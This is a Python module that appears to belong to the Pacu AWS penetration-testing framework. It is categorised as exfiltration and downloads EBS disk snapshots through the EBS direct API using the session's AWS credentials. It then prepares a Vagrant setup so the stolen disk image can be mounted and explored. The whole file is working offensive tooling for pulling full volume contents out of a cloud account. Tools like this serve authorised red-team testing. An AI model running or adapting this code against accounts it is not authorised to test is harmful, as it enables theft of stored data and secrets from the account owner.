#!/usr/bin/env python3
"""Module for ebs_snapshot_explorer"""
import argparse
import sys
from typing import List
from typing_extensions import TypedDict

from dsnap import snapshot, utils

from pacu import Main
from pacu.core.lib import downloads_dir

module_info = {
    'name': 'ebs__download_snapshots',
    'author': 'Ryan Gerstenkorn ryan.gerstenkorn@rhinosecuritylabs.com',
    'category': 'EXFIL',
    'one_liner': 'Downloads EBS snapshots',
    'description': 'This module uses the EBS direct API to download specific snapshots to your computer. These can then be '
                   'mounted and explored using either docker or vagrant. For more information on how to mount these snapshots'
                   'see https://github.com/RhinoSecurityLabs/dsnap#mounting-in-vagrant.',
    'services': ['EC2'],
    'prerequisite_modules': ['ebs__enum_volumes_snapshots'],
    'arguments_to_autocomplete': ['--snapshot-id'],
}

parser = argparse.ArgumentParser(add_help=False, description=str(module_info['description']))
parser.add_argument(
    '--snapshot-id',
    required=False,
    help='InstanceId of instance to target'
)

parser.add_argument(
    '--region',
    required=False,
    help='InstanceId of instance to target'
)


def snapshot_prompt(snapshots: List[dict]) -> dict:
    """Prompt's the user for an item to select from the items passed. Item is expected to support the Item protocol."""
    for i, snap in enumerate(snapshots):
        print(f"{i}) Id: {snap['SnapshotId']}, VolumeId: {snap['VolumeId']}, OwnerId {snap['OwnerId']}, Size: {snap['VolumeSize']}, {snap['Description']})")
    answer = int(input('Select Snapshot: '))
    try:
        return snapshots[answer]
    except IndexError:
        print(f"Invalid selection, valid inputs are 0 through {len(snapshots) - 1}", file=sys.stderr)
        return snapshot_prompt(snapshots)


SummaryData = TypedDict('SummaryData', {
    'out_dir': str,
    'snapshot_id': str,
    'snapshot_path': str,
    'vagrantfile': str,
})


def main(args, pacu: Main):
    """Main module function, called from Pacu"""
    print = pacu.print
    session = pacu.get_active_session()
    snapshot_id = parser.parse_args(args).snapshot_id
    region = parser.parse_args(args).region

    if not snapshot_id:
        if not pacu.fetch_data(['EC2', 'Snapshots'], 'ebs__enum_volumes_snapshots', ''):
            print('Failed to fetch EBS snapshot data')
            return False

        try:
            s = snapshot_prompt(session.EC2['Snapshots'])
            snapshot_id = s['SnapshotId']
            region = s['Region']
        except UserWarning as e:
            print(*e.args)
            return False

    try:
        out_dir = downloads_dir()/'ebs/snapshots'
        snap = snapshot.LocalSnapshot(str(out_dir), snapshot_id, pacu.get_boto_session(region=region), pacu.get_botocore_conf())
    except UserWarning as e:
        print(*e.args)
        return False

    snap.fetch()

    return SummaryData(
        out_dir=str(out_dir.relative_to('.')),
        snapshot_id=snapshot_id,
        snapshot_path=str(snap.path),
        vagrantfile=str(utils.init_vagrant(out_dir, True)),
    )


def summary(data, pacu):
    msg = ''
    if not data:
        msg = 'Module execution failed'
    else:
        msg += (
                "*******************************************************************************************************\n\n"
                f" Snapshot {data['snapshot_id']} written to {data['snapshot_path']}\n" +
                "To mount this image make sure vagrant and virtualbox are installed and run: \n\n" +
                f"cd {data['out_dir']}\n"
                f"IMAGE={data['snapshot_id']}.img vagrant up\n"
                "\n*******************************************************************************************************\n\n"
        )
    return msg
